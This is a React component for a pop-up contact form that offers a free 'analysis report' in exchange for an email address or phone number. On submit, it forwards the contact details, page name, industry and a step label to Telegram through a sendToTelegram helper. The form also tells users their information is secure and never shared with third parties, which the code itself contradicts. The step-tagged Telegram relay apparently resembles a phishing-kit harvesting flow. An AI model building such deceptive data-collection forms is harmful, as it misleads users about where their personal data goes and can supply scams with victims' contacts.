import React, { useState } from 'react';
import { Mail, Phone, Shield, Gift } from 'lucide-react';
import { sendToTelegram } from '../services/telegram';

interface ContactFormProps {
  onSubmit: (contact: string) => void;
  analysisData: { pageName: string; industry: string } | null;
}

export default function ContactForm({ onSubmit, analysisData }: ContactFormProps) {
  const [contact, setContact] = useState('');
  const [contactType, setContactType] = useState<'email' | 'phone'>('email');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (contact.trim() && !isSubmitting) {
      setIsSubmitting(true);
      
      try {
        // Send to Telegram
        await sendToTelegram({
          contact: contact.trim(),
          pageName: analysisData?.pageName || '',
          industry: analysisData?.industry || '',
          step: 'contact'
        });
      } catch (error) {
        console.error('Failed to send to Telegram:', error);
      }
      
      onSubmit(contact.trim());
      setIsSubmitting(false);
    }
  };

  const formatPhoneNumber = (value: string) => {
    // Remove all non-digits
    const digits = value.replace(/\D/g, '');
    
    // Limit to reasonable phone number length
    if (digits.length <= 11) {
      return digits;
    }
    return digits.slice(0, 11);
  };

  const handleContactChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    
    if (contactType === 'phone') {
      const formattedPhone = formatPhoneNumber(value);
      setContact(formattedPhone);
    } else {
      setContact(value);
    }
  };
  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 overflow-y-auto">
      <div className="bg-white rounded-2xl shadow-2xl p-6 sm:p-8 max-w-md w-full mx-4 my-8">
        <div className="text-center mb-6">
          <div className="bg-gradient-to-r from-green-100 to-blue-100 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
            <Gift className="h-8 w-8 text-green-600" />
          </div>
          <h3 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">
            Get Your Free Detailed Report
          </h3>
          <p className="text-sm sm:text-base text-gray-600">
            Enter your contact information to receive the comprehensive analysis report directly
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <div className="flex space-x-2 sm:space-x-4 mb-4">
              <button
                type="button"
                onClick={() => setContactType('email')}
                className={`flex-1 py-2 px-2 sm:px-4 rounded-lg font-medium transition-all text-sm sm:text-base ${
                  contactType === 'email'
                    ? 'bg-blue-100 text-blue-700 border-2 border-blue-300'
                    : 'bg-gray-100 text-gray-600 border-2 border-transparent'
                }`}
                disabled={isSubmitting}
              >
                <Mail className="h-3 w-3 sm:h-4 sm:w-4 inline mr-1 sm:mr-2" />
                Email
              </button>
              <button
                type="button"
                onClick={() => setContactType('phone')}
                className={`flex-1 py-2 px-2 sm:px-4 rounded-lg font-medium transition-all text-sm sm:text-base ${
                  contactType === 'phone'
                    ? 'bg-blue-100 text-blue-700 border-2 border-blue-300'
                    : 'bg-gray-100 text-gray-600 border-2 border-transparent'
                }`}
                disabled={isSubmitting}
              >
                <Phone className="h-3 w-3 sm:h-4 sm:w-4 inline mr-1 sm:mr-2" />
                Phone
              </button>
            </div>

            <div className="relative">
              {contactType === 'email' ? (
                <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
              ) : (
                <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
              )}
              <input
                type={contactType === 'email' ? 'email' : 'tel'}
                value={contact}
                onChange={handleContactChange}
                placeholder={
                  contactType === 'email'
                    ? 'Enter your email address...'
                    : 'Enter your phone number...'
                }
                className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-sm sm:text-base"
                required
                disabled={isSubmitting}
                inputMode={contactType === 'phone' ? 'numeric' : 'email'}
                pattern={contactType === 'phone' ? '[0-9]*' : undefined}
              />
            </div>
          </div>

          <div className="bg-blue-50 p-3 sm:p-4 rounded-lg">
            <div className="flex items-start space-x-3">
              <Shield className="h-4 w-4 sm:h-5 sm:w-5 text-blue-600 mt-0.5 flex-shrink-0" />
              <div className="text-xs sm:text-sm text-blue-800">
                <p className="font-semibold mb-1">Why we need this information:</p>
                <p>We'll send your personalized report directly to ensure secure delivery and provide ongoing optimization tips.</p>
              </div>
            </div>
          </div>

          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-green-600 to-blue-600 text-white py-3 px-6 rounded-lg font-semibold hover:from-green-700 hover:to-blue-700 transform hover:scale-[1.02] transition-all duration-200 shadow-lg disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none text-sm sm:text-base"
          >
            {isSubmitting ? (
              <div className="flex items-center justify-center space-x-2">
                <div className="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></div>
                <span>Processing...</span>
              </div>
            ) : (
              'Continue to Report'
            )}
          </button>
        </form>

        <div className="mt-6 text-center">
          <p className="text-xs sm:text-sm text-gray-500">
            🔒 Your information is secure and will never be shared with third parties
          </p>
        </div>
      </div>
    </div>
  );
}